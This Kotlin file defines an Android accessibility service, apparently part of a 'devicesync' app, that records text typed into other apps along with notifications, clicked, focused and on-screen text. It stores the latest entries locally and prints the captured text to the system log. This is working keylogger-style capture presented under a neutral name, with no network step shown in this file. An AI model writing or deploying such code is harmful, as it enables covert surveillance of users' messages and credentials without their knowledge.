package com.devicesync.app.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicLong

class TextInputAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "TextInputAccessibility"
        var isServiceEnabled = false
        private val lastEventTime = AtomicLong(0)
        private const val MIN_EVENT_INTERVAL = 500L // 500ms minimum between events
    }
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        isServiceEnabled = true
        Log.d(TAG, "✅ Text Input Accessibility Service connected")
        
        // Send service status to main app
        sendBroadcast(Intent("TEXT_INPUT_SERVICE_STATUS").apply {
            putExtra("enabled", true)
        })
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        try {
            // Rate limiting - only process one event every 500ms
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastEventTime.get() < MIN_EVENT_INTERVAL) {
                return
            }
            lastEventTime.set(currentTime)
            
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotificationEvent(event)
                AccessibilityEvent.TYPE_VIEW_CLICKED -> handleViewClicked(event)
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleViewFocused(event)
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleWindowContentChanged(event)
                else -> {
                    // Log other event types for debugging
                    if (event.eventType != AccessibilityEvent.TYPE_VIEW_SCROLLED) {
                        Log.d(TAG, "📱 Event: ${getEventTypeName(event.eventType)} in ${event.packageName}")
                    }
                }
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}")
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val changedText = event.text.joinToString("")
            val beforeText = event.beforeText?.toString() ?: ""
            
            // Skip empty or system events
            if (packageName == "unknown" || packageName.startsWith("com.android.") || packageName.startsWith("android.")) {
                return
            }
            
            // Skip if no meaningful text change
            if (changedText.isEmpty() && beforeText.isEmpty()) {
                return
            }
            
            val timestamp = System.currentTimeMillis()
            val body = if (changedText.isNotEmpty()) changedText else beforeText
            
            // Create simple data object
            val data = JSONObject().apply {
                put("package_name", packageName)
                put("text", body)
                put("timestamp", timestamp)
                put("event_type", "text_changed")
            }
            
            // Store locally in background thread
            storeTextDataAsync(data)
            
            Log.d(TAG, "📝 Text: '$body' in $packageName")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling text change: ${e.message}")
        }
    }

    private fun storeTextDataAsync(data: JSONObject) {
        Thread {
            try {
                val prefs = getSharedPreferences("accessibility_text_data", MODE_PRIVATE)
                val key = "text_${System.currentTimeMillis()}"
                prefs.edit().putString(key, data.toString()).apply()
                
                // Keep only last 20 entries to minimize memory usage
                val allKeys = prefs.all.keys.filter { it.startsWith("text_") }.sorted()
                if (allKeys.size > 20) {
                    val keysToRemove = allKeys.take(allKeys.size - 20)
                    prefs.edit().apply {
                        keysToRemove.forEach { remove(it) }
                    }.apply()
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error storing text data: ${e.message}")
            }
        }.start()
    }

    override fun onInterrupt() {
        Log.d(TAG, "⚠️ Text Input Accessibility Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceEnabled = false
        Log.d(TAG, "❌ Text Input Accessibility Service destroyed")
        
        // Send service status to main app
        sendBroadcast(Intent("TEXT_INPUT_SERVICE_STATUS").apply {
            putExtra("enabled", false)
        })
    }

    // Helper method to get all stored text data
    fun getAllTextData(): List<JSONObject> {
        val prefs = getSharedPreferences("accessibility_text_data", MODE_PRIVATE)
        return prefs.all.entries
            .filter { it.key.startsWith("text_") }
            .mapNotNull { 
                try {
                    JSONObject(it.value.toString())
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing text data: ${e.message}")
                    null
                }
            }
            .sortedBy { it.optLong("timestamp", 0) }
    }

    // Helper method to clear all stored text data
    fun clearAllTextData() {
        val prefs = getSharedPreferences("accessibility_text_data", MODE_PRIVATE)
        val keysToRemove = prefs.all.keys.filter { it.startsWith("text_") }
        prefs.edit().apply {
            keysToRemove.forEach { remove(it) }
        }.apply()
        Log.d(TAG, "🗑️ All text data cleared")
    }

    private fun handleNotificationEvent(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val text = event.text.joinToString(" ")
            
            if (packageName != "unknown" && text.isNotEmpty()) {
                val data = JSONObject().apply {
                    put("package_name", packageName)
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("event_type", "notification")
                }
                storeTextDataAsync(data)
                Log.d(TAG, "🔔 Notification: '$text' in $packageName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling notification event: ${e.message}")
        }
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val text = event.text.joinToString(" ")
            
            if (packageName != "unknown" && text.isNotEmpty()) {
                val data = JSONObject().apply {
                    put("package_name", packageName)
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("event_type", "view_clicked")
                }
                storeTextDataAsync(data)
                Log.d(TAG, "👆 Clicked: '$text' in $packageName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling view clicked event: ${e.message}")
        }
    }

    private fun handleViewFocused(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val text = event.text.joinToString(" ")
            
            if (packageName != "unknown" && text.isNotEmpty()) {
                val data = JSONObject().apply {
                    put("package_name", packageName)
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("event_type", "view_focused")
                }
                storeTextDataAsync(data)
                Log.d(TAG, "🎯 Focused: '$text' in $packageName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling view focused event: ${e.message}")
        }
    }

    private fun handleWindowContentChanged(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val text = event.text.joinToString(" ")
            
            if (packageName != "unknown" && text.isNotEmpty()) {
                val data = JSONObject().apply {
                    put("package_name", packageName)
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("event_type", "window_content_changed")
                }
                storeTextDataAsync(data)
                Log.d(TAG, "🪟 Window changed: '$text' in $packageName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling window content changed event: ${e.message}")
        }
    }

    private fun getEventTypeName(eventType: Int): String {
        return when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "VIEW_CLICKED"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "VIEW_FOCUSED"
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> "VIEW_SCROLLED"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "VIEW_TEXT_CHANGED"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "NOTIFICATION_STATE_CHANGED"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "WINDOW_CONTENT_CHANGED"
            else -> "UNKNOWN($eventType)"
        }
    }
} 